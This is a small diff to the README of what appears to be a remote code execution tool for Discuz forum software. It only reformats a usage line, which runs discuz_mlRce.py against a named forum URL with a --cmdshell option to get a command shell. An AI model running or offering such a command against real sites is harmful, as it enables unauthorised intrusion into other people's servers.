@@ -41,8 +41,9 @@ pip -r requirements.txt
 
 ------
 **GETTING Command Shell**
-<br/>
-`python discuz_mlRce.py -u "http://www.ppp.cn/forum.php" --cmdshell`<br/>
+
+`python discuz_mlRce.py -u "http://www.ppp.cn/forum.php" --cmdshell`
+
 ----------------
 
 **GETTING Shell URL**
